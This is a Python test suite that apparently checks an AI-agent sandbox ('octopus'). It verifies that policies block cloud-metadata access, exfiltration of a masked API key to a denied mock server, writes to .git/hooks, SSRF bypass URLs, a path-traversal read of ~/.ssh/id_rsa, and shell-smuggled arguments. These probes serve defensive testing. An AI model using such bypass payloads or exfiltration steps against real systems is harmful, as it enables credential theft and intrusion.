"""Tier 4: Real-World Application Scenarios & Release Gates — 6 tests."""

from __future__ import annotations

import json
import sys
import unittest

from . import helpers


class TestTier4Scenarios(unittest.TestCase):
    """6 full end-to-end real-world scenarios and release gates."""

    def test_t4_01_multi_step_python_agent_containment_e2e(self) -> None:
        """T4-01: Multi-step Python agent succeeds on allowed API+write while IMDS, exfil, and `.git/hooks` write are blocked."""
        octo = helpers.require_octopus_bin()
        secret = "sk-t4-multi-step-secret-12345"
        with (
            helpers.LocalLoopbackMockServer() as allowed_srv,
            helpers.LocalLoopbackMockServer() as denied_srv,
            helpers.TempWorkspace() as ws,
        ):
            ws.make_dir(".git/hooks")
            out_dir = ws.make_dir("agent_out")
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [allowed_srv.host_port],
                    "denied_domains": [denied_srv.host_port],
                    "denied_resolved_addresses": ["169.254.169.254/32"],
                    "commands": {"allow": ["python", "python3"], "deny": ["bash", "sh", "powershell", "cmd"]},
                    "filesystem": {
                        "allow_read": [str(ws.path)],
                        "allow_write": [str(out_dir)],
                        "deny": ["~/.ssh", "~/.aws", ".git/hooks", ".mcp.json"],
                    },
                    "credentials": {
                        "mask_env": ["OPENAI_API_KEY"],
                        "inject_hosts": [allowed_srv.host_port],
                    },
                    "limits": {"memory_mb": 256, "timeout_secs": 20},
                },
            )
            hook_target = ws.path / ".git" / "hooks" / "pre-commit"
            out_file = out_dir / "summary.json"
            agent_script = ws.write_file(
                "multi_agent.py",
                (
                    "import json, os, pathlib, sys, urllib.request\n"
                    "os.environ.pop('NO_PROXY', None)\n"
                    "os.environ.pop('no_proxy', None)\n"
                    "proxy = os.environ['HTTP_PROXY']\n"
                    "opener = urllib.request.build_opener(urllib.request.ProxyHandler({'http': proxy, 'https': proxy}))\n"
                    "masked_key = os.environ.get('OPENAI_API_KEY', '')\n"
                    "assert masked_key.startswith('ao_mask_'), f'Secret not masked: {masked_key!r}'\n"
                    f"assert {secret!r} not in masked_key\n"
                    "# 1. Allowed API call\n"
                    f"with opener.open({f'{allowed_srv.base_url}/ok'!r}, timeout=8) as r:\n"
                    "    assert r.status == 200\n"
                    "# 2. Allowed workspace write\n"
                    f"pathlib.Path({str(out_file)!r}).write_text(json.dumps({{'api': 'ok'}}), encoding='utf-8')\n"
                    "# 3. Blocked IMDS\n"
                    "imds_blocked = False\n"
                    "try:\n"
                    "    opener.open('http://169.254.169.254/latest/meta-data/', timeout=6)\n"
                    "except Exception:\n"
                    "    imds_blocked = True\n"
                    "# 4. Blocked exfiltration to denied server\n"
                    "exfil_blocked = False\n"
                    "try:\n"
                    f"    opener.open(urllib.request.Request({f'{denied_srv.base_url}/exfil'!r}, data=masked_key.encode()), timeout=6)\n"
                    "except Exception:\n"
                    "    exfil_blocked = True\n"
                    "res = {'imds_blocked': imds_blocked, 'exfil_blocked': exfil_blocked}\n"
                    "print(json.dumps(res))\n"
                    "sys.exit(0 if (imds_blocked and exfil_blocked) else 1)\n"
                ),
            )
            env = helpers.default_clean_env({"OPENAI_API_KEY": secret})
            res = ws.run_octopus(
                ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", sys.executable, str(agent_script)],
                octopus_bin=octo,
                env=env,
                timeout=30.0,
            )
            self.assertEqual(res.returncode, 0, f"Multi-step allowed agent failed:\n{res.combined_output}")
            self.assertEqual(allowed_srv.hit_count(), 1, f"Expected 1 allowed API hit, got {allowed_srv.hit_count()}")
            self.assertTrue(out_file.is_file(), f"Expected allowed workspace write at {out_file}")
            self.assertEqual(denied_srv.hit_count(), 0, "Denied exfil server received unauthorized hit!")
            self.assertNotIn(secret, res.stdout)
            self.assertNotIn(secret, res.stderr)

            # 5. Separate invocation for mandatory write-deny target (.git/hooks/pre-commit)
            hook_script = ws.write_file(
                "hook_write.py",
                (
                    "import pathlib\n"
                    f"pathlib.Path({str(hook_target)!r}).write_text('#!/bin/sh\\n', encoding='utf-8')\n"
                    "print('UNEXPECTED_HOOK_WRITE')\n"
                ),
            )
            res_hook = ws.run_octopus(
                ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", sys.executable, str(hook_script)],
                octopus_bin=octo,
                env=env,
                timeout=30.0,
            )
            self.assertNotIn("UNEXPECTED_HOOK_WRITE", res_hook.stdout)
            self.assertFalse(hook_target.exists(), ".git/hooks/pre-commit was created despite mandatory write-deny!")
            helpers.assert_blocked_outcome(res_hook)
            self.assertIn("blocked_by_octopus_policy", res_hook.stderr.lower())
            self.assertIn("permissionerror", res_hook.stderr.lower())

    def test_t4_02_quickstart_30s_e2e_workflow(self) -> None:
        """T4-02: 30-second quickstart (`examples/quickstart/`) runs end-to-end under `octopus run`."""
        cfg = helpers.get_config()
        octo = helpers.require_octopus_bin(cfg)
        repo = cfg.repo_root
        qdir = repo / "examples" / "quickstart"
        p_json = qdir / "policy.json"
        p_cedar = qdir / "policy.cedar"
        my_agent = qdir / "my_agent.py"
        for f in (p_json, p_cedar, my_agent):
            self.assertTrue(f.is_file(), f"Missing quickstart artifact: {f}")
        self.assertEqual(helpers.validate_stdlib_python_file(my_agent), [])

        res = helpers.run_subprocess_safe(
            [str(octo), "run", "--policy", str(p_json), "--", sys.executable, str(my_agent)],
            cwd=repo,
            env=helpers.default_clean_env(),
            timeout=30.0,
        )
        self.assertEqual(res.returncode, 0, f"Quickstart exited {res.returncode}:\n{res.combined_output}")
        lower = res.combined_output.lower()
        self.assertTrue(
            ("allow" in lower or "ok" in lower) and ("block" in lower or "deny" in lower or "403" in lower),
            f"Quickstart output should demonstrate both allowed and blocked actions:\n{res.combined_output}",
        )

    def test_t4_03_cargo_build_and_cargo_test_release_gate(self) -> None:
        """T4-03: Full Rust release gate (`cargo fmt --check`, CI `cargo clippy`, `cargo build --all-features`, `cargo test --all-features`), gated by --skip-cargo."""
        cfg = helpers.get_config()
        if cfg.skip_cargo:
            self.skipTest("Explicit --skip-cargo specified")
        repo = cfg.repo_root
        clippy_cmd = [
            "cargo",
            "clippy",
            "--all-targets",
            "--all-features",
            "--",
            "-D",
            "warnings",
            "-A",
            "clippy::bool_assert_comparison",
            "-A",
            "clippy::doc_lazy_continuation",
            "-A",
            "clippy::field_reassign_with_default",
            "-A",
            "clippy::const_is_empty",
            "-A",
            "clippy::type_complexity",
            "-A",
            "clippy::too_many_arguments",
            "-A",
            "clippy::needless_borrows_for_generic_args",
            "-A",
            "clippy::upper_case_acronyms",
            "-A",
            "clippy::unnecessary_cast",
        ]

        def _porcelain_paths() -> dict[str, str]:
            st = helpers.run_subprocess_safe(
                ["git", "status", "--porcelain", "--", "config", "data"],
                cwd=repo,
                timeout=30.0,
            )
            entries: dict[str, str] = {}
            if st.returncode == 0:
                for line in st.stdout.splitlines():
                    if len(line) >= 4:
                        code = line[:2]
                        rel = line[3:].strip().strip('"')
                        if " -> " in rel:
                            rel = rel.split(" -> ", 1)[1].strip().strip('"')
                        entries[rel] = code
            return entries

        pre_dirty = _porcelain_paths()
        for label, cmd in (
            ("cargo fmt", ["cargo", "fmt", "--all", "--", "--check"]),
            ("cargo clippy", clippy_cmd),
            ("cargo build", ["cargo", "build", "--all-features"]),
            ("cargo test", ["cargo", "test", "--all-features"]),
        ):
            res = helpers.run_subprocess_safe(cmd, cwd=repo, timeout=900.0)
            self.assertEqual(
                res.returncode,
                0,
                f"{label} failed (exit {res.returncode}):\n{res.stdout}\n{res.stderr}",
            )

        post_dirty = _porcelain_paths()
        self.assertEqual(
            post_dirty,
            pre_dirty,
            f"Cargo fmt/clippy/build/test mutated config/ or data/ paths: "
            f"before={pre_dirty} after={post_dirty}",
        )

        ship_script = repo / "scripts" / "solo_pr_ship.ps1"
        self.assertTrue(ship_script.is_file(), f"Missing solo_pr_ship.ps1: {ship_script}")
        if sys.platform == "win32":
            ship_res = helpers.run_subprocess_safe(
                [
                    "powershell",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-File",
                    str(ship_script),
                    "-ValidateOnly",
                ],
                cwd=repo,
                timeout=30.0,
            )
            self.assertEqual(
                ship_res.returncode,
                0,
                f"solo_pr_ship.ps1 -ValidateOnly failed (exit {ship_res.returncode}):\n{ship_res.combined_output}",
            )

    def test_t4_04_staff_security_engineer_onboarding_audit(self) -> None:
        """T4-04: End-to-end Staff Security Engineer onboarding, hygiene, history, sibling, and GitHub metadata audit."""
        cfg = helpers.get_config()
        repo = cfg.repo_root

        # 1. Positioning & links in README.md
        readme = (repo / "README.md").read_text(encoding="utf-8")
        lower = readme.lower()
        for expected in ("agentmesh", "cage", "cedar", "wasmtime", "octopus run --policy"):
            self.assertIn(expected, lower, f"README missing `{expected}`")
        self.assertNotRegex(readme, r"\]\(LICENSE\)")
        self.assertNotIn("file:///", lower)
        d3qn_violations = helpers.validate_readme_d3qn_advisory(readme)
        self.assertEqual(d3qn_violations, [], "; ".join(d3qn_violations))

        # 2. Clean git index + preserved history
        tracked = helpers.git_ls_files(repo)
        self.assertEqual(helpers.check_repo_hygiene_paths(tracked), [])
        self.assertTrue(helpers.git_is_ancestor(repo, helpers.BASELINE_ANCESTOR_SHA, "HEAD"))

        # 3. Sibling repo immutability
        sr_violations = helpers.validate_sibling_repo_state(
            helpers.SIBLING_SANDBOX_RUNTIME,
            expected_head_sha=helpers.BASELINE_SANDBOX_RUNTIME_SHA,
            allowed_untracked=helpers.SANDBOX_RUNTIME_ALLOWED_UNTRACKED,
            allowed_porcelain=helpers.SANDBOX_RUNTIME_ALLOWED_PORCELAIN,
        )
        self.assertEqual(sr_violations, [], "; ".join(sr_violations))
        self.assertEqual(helpers.git_status_porcelain(helpers.SIBLING_KILLSWITCH), [])
        self.assertEqual(helpers.git_rev_parse(helpers.SIBLING_KILLSWITCH), helpers.BASELINE_KILLSWITCH_SHA)

        # 4. Remote & GitHub metadata (unless --skip-remote)
        if not cfg.skip_remote:
            meta = helpers.run_gh_repo_view(helpers.EXPECTED_REMOTE_SUBSTR)
            desc = (meta.get("description") or "").strip()
            self.assertTrue(desc, "GitHub description must be non-empty")
            self.assertNotIn("d3qn", desc.lower())
            remote_head = helpers.run_git(repo, ["ls-remote", "--heads", "origin", "main"]).stdout.strip().split()[0]
            self.assertEqual(helpers.git_rev_parse(repo, "HEAD"), remote_head)

    def test_t4_05_d3qn_poisoned_vs_default_off_e2e_invariant(self) -> None:
        """T4-05: CLI + Web API decisions remain 100% invariant across default-off, poisoned HardMitigation, and poisoned PassiveObserve."""
        cfg = helpers.get_config()
        octo = helpers.require_octopus_bin(cfg)
        agent_bin = helpers.require_agent_bin(cfg)

        with (
            helpers.LocalLoopbackMockServer() as allowed_srv,
            helpers.LocalLoopbackMockServer() as denied_srv,
        ):
            modes = [
                ("default_off", None, helpers.default_clean_env()),
                ("poison_hard", "HardMitigation", helpers.default_clean_env({"OCTOPUS_ENABLE_RL_ADVISORY": "1"})),
                ("poison_passive", "PassiveObserve", helpers.default_clean_env({"OCTOPUS_ENABLE_RL_ADVISORY": "1"})),
            ]
            observed_cli = []
            observed_web = []

            for mode_name, bias, env in modes:
                with helpers.TempWorkspace() as ws:
                    if bias is not None:
                        ws.write_poisoned_rl_policy(bias=bias)
                    policy = ws.write_json(
                        "policy.json",
                        {
                            "allowed_domains": [allowed_srv.host_port],
                            "denied_domains": [denied_srv.host_port],
                            "commands": {"allow": ["python", "python3"]},
                        },
                    )
                    ok_py = ws.write_file("ok.py", helpers.proxy_probe_script(f"{allowed_srv.base_url}/ok"))
                    bad_py = ws.write_file("bad.py", helpers.proxy_probe_script(f"{denied_srv.base_url}/bad"))

                    allowed_srv.clear_hits()
                    denied_srv.clear_hits()
                    r_ok = ws.run_octopus(
                        ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", sys.executable, str(ok_py)],
                        octopus_bin=octo,
                        env=env,
                    )
                    r_bad = ws.run_octopus(
                        ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", sys.executable, str(bad_py)],
                        octopus_bin=octo,
                        env=env,
                    )
                    observed_cli.append((mode_name, r_ok.returncode, allowed_srv.hit_count(), denied_srv.hit_count()))
                    self.assertEqual(r_ok.returncode, 0, f"[{mode_name}] allow CLI failed: {r_ok.combined_output}")
                    helpers.assert_blocked_outcome(r_bad, mock_server=denied_srv)

                    extra_srv_env = {"OCTOPUS_ENABLE_RL_ADVISORY": "1"} if bias else {}
                    with helpers.WebServerHandle(ws, agent_bin=agent_bin, extra_env=extra_srv_env) as srv:
                        _, c_allow = srv.post_json(
                            "/api/evaluate-cedar",
                            {"principal": "document_arm", "action": "extract", "resource": "doc_1", "context": {}},
                        )
                        _, c_deny = srv.post_json(
                            "/api/evaluate-cedar",
                            {
                                "principal": "network_arm",
                                "action": "egress",
                                "resource": "https://evil.example.com",
                                "context": {"destination_domain": "evil.example.com"},
                            },
                        )
                        _, g_res = srv.post_json(
                            "/api/governor/inject-sample",
                            {"event_type": "shell_exec", "is_malicious": True, "use_rl_mitigation": True},
                        )
                        self.assertAlmostEqual(
                            float(g_res["effective_epsilon_t"]),
                            float(g_res["raw_epsilon_t"]),
                            places=9,
                        )
                        observed_web.append(
                            (
                                bool(c_allow.get("is_allowed")),
                                bool(c_deny.get("is_allowed")),
                                round(float(g_res["survival_probability"]), 9),
                            )
                        )

            self.assertEqual(len({tuple(x[1:]) for x in observed_cli}), 1, f"CLI verdicts varied across RL modes: {observed_cli}")
            self.assertEqual(len(set(observed_web)), 1, f"Web API verdicts varied across RL modes: {observed_web}")
            self.assertEqual(observed_web[0][:2], (True, False))

    def test_t4_06_adversarial_bypass_resilience_smoke(self) -> None:
        """T4-06: Adversarial bypass probes (traversal `../../.ssh`, `[::ffff:169.254.169.254]`, `0x7f000001`, `127.0.0.1@169.254.169.254`, `#fragment`, trailing-dot IMDS, `TRACE`, shell smuggling) are blocked."""
        octo = helpers.require_octopus_bin()
        with helpers.LocalLoopbackMockServer() as srv, helpers.TempWorkspace() as ws:
            policy = ws.write_json(
                "policy.json",
                {
                    "allowed_domains": [srv.host_port],
                    "denied_domains": [],
                    "denied_resolved_addresses": ["169.254.169.254/32"],
                    "commands": {"allow": ["python", "python3"], "deny": ["bash", "sh", "powershell", "cmd"]},
                    "filesystem": {"allow_read": [str(ws.path)], "allow_write": [str(ws.path)], "deny": ["~/.ssh", ".git/hooks"]},
                },
            )

            # 1) Trailing-dot IMDS bypass probe
            imds_dot = ws.write_file(
                "imds_dot.py",
                helpers.proxy_probe_script("http://169.254.169.254./latest/meta-data/"),
            )
            res_imds = ws.run_octopus(
                ["run", "--policy", str(policy), "--", sys.executable, str(imds_dot)],
                octopus_bin=octo,
            )
            helpers.assert_blocked_outcome(res_imds)

            # 2) Contracted proxy/SSRF bypass, TRACE method, and #fragment probes
            for name, url, method in (
                ("ipv6_mapped_imds", "http://[::ffff:169.254.169.254]/latest/meta-data/", "GET"),
                ("hex_loopback", "http://0x7f000001/", "GET"),
                ("userinfo_authority_smuggle", "http://127.0.0.1@169.254.169.254/latest/meta-data/", "GET"),
                ("url_fragment", f"{srv.base_url}/ok#smuggled", "GET"),
                ("trace_method", f"{srv.base_url}/ok", "TRACE"),
            ):
                srv.clear_hits()
                probe = ws.write_file(f"{name}.py", helpers.proxy_probe_script(url, method=method))
                res_p = ws.run_octopus(
                    ["run", "--policy", str(policy), "--", sys.executable, str(probe)],
                    octopus_bin=octo,
                )
                helpers.assert_blocked_outcome(res_p, mock_server=srv)

            # 3) Path traversal probe (`../../.ssh/id_rsa`) must be blocked by policy, never via FileNotFoundError
            res_trav = ws.run_octopus(
                [
                    "run",
                    "--policy",
                    str(policy),
                    "--cwd",
                    str(ws.path),
                    "--",
                    sys.executable,
                    "-c",
                    "import pathlib; print(pathlib.Path('../../.ssh/id_rsa').read_text())",
                ],
                octopus_bin=octo,
            )
            self.assertNotIn(
                "FileNotFoundError",
                res_trav.stderr,
                "Path traversal probe passed vacuously via FileNotFoundError instead of policy block",
            )
            helpers.assert_blocked_outcome(res_trav)

            # 4) Shell-smuggling probes (`sh -c "echo pwned"` and `; bash -c id`)
            res_sh = ws.run_octopus(
                ["run", "--policy", str(policy), "--cwd", str(ws.path), "--", "sh", "-c", "echo pwned"],
                octopus_bin=octo,
            )
            self.assertNotIn("pwned", res_sh.stdout)
            helpers.assert_blocked_outcome(res_sh)

            res_smuggle = ws.run_octopus(
                [
                    "run",
                    "--policy",
                    str(policy),
                    "--cwd",
                    str(ws.path),
                    "--",
                    sys.executable,
                    "-c",
                    "print('SMUGGLED_ARGS')",
                    ";",
                    "bash",
                    "-c",
                    "id",
                ],
                octopus_bin=octo,
            )
            self.assertNotIn("SMUGGLED_ARGS", res_smuggle.stdout)
            helpers.assert_blocked_outcome(res_smuggle)
